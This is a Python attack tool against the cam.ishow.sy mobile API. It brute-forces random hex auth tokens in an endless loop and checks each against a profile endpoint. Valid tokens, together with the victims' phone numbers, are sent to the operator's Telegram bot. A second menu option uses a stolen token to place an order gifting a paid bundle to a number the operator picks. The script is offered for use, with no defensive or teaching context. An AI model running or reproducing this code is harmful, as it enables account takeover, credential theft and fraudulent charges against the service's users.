import secrets
import rich
import uuid
import threading
import requests
from rich import print
import random
import os
from rich.console import Console
console = Console()
class obito:
	def send_pond(hex,number):
		headers = {
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; Redmi 8A MIUI/V12.5.2.0.QCMMIXM)',
		    'Host': 'cam.ishow.sy',
		    'Connection': 'Keep-Alive',
		}
		
		data = {
		    'auth': hex,
		    'bundle_id': '33',
		    'balance': '35000',
		    'duration': '720',
		    'disconnect_time': '540000',
		    'gift_to': number,
		    'payment_mode': '0',
		}
		
		response = requests.post('https://cam.ishow.sy/crudAPI_mobile/aplitv_processNewOrder/', headers=headers, data=data).json()
		return response
	def token_create():
		hex = secrets.token_hex(16)
		headers = {
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; Redmi 8A MIUI/V12.5.2.0.QCMMIXM)',
		    'Host': 'cam.ishow.sy',
		    'Connection': 'Keep-Alive',
		}
		data = {
		    'auth': hex,
		}
		
		response = requests.post('https://cam.ishow.sy/crudAPI_mobile/aplitv_getUserProfile/', headers=headers, data=data)
		v = response.json()['status']
		if v == 'Failed':
			return {'status':"BAD",
			"token":hex,
			}
		else:
			e = response.json()["msg"]["user"]
			return {'status':"GOOD",
			"token":hex,
			"user":e
			}
	def send(token,id,text):
		requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=DEV > @OBITOPY + @PYTHONIC1 
		+{text}''')
	def bad_emoji():
		bb = ''.join(random.choice(["☠️",
		"💔",
		"☹️"])for h in range(1))
		return bb
	def good_emoji():
		cc = ''.join(random.choices(["🤠","💋","🥂"])for bbn in range(1))
		return cc
	def main():
		console.print("[bold green on black]			  LOGIN[/]")
		token = console.input("[blue on white][bold]SUBMIT YOUR TELE TOKEN [/][/] : ")
		ID = console.input("\n[blue on white][bold]SUBMIT YOUR TELE ID [/][/] : ")
		os.system("clear")
		console.print("""[bold red]ishow[/] [bold green]v1.0[/]\nmy channel : [undrline]https://t.me/pythonic1[/]\nmy account : [undrline]https://t.me/obitopy[/]""")
		xx = console.input("""[bold green]1 - start hunt auth hex[/]\n\n[bold red]0 - exit[/]\n\n""")
		if '1'==xx:
			while True:
				gg = obito.token_create()
				if gg["status"]=="BAD":
					ccc = gg["token"]
					console.print(f"[bold red]BAD : {ccc}  [/]"+obito.bad_emoji())
				elif gg["status"]=="GOOD":
					cccc = gg["token"]
					rr = gg["user"]
					console.print(f"[bold green]GOOD : {cccc} | {rr}  "+obito.good_emoji())
					obito.send(token,ID,f"""GOOD TOKEN\nHEX TOKEN : {cccc}\nNUMBER : {rr}""")
				
		elif "2"==xx:
			hex = console.input("[bold green]YOUR HEX AUTH : [/]")
			number = console.input("[bold green]YOUR NUMBER LIKE THIS 963999**** : [/]")
			os.system("clear")
			c = obito.send_pond(hex,number)
			if c['status']=='Failed':
				console.print("[bold red]auth hex or num or money not good[/]")
			else:
				console.print("[blod green]you request is good[/]")
		elif '0'==xx:
			exit()
		else:
			pass
obito.main()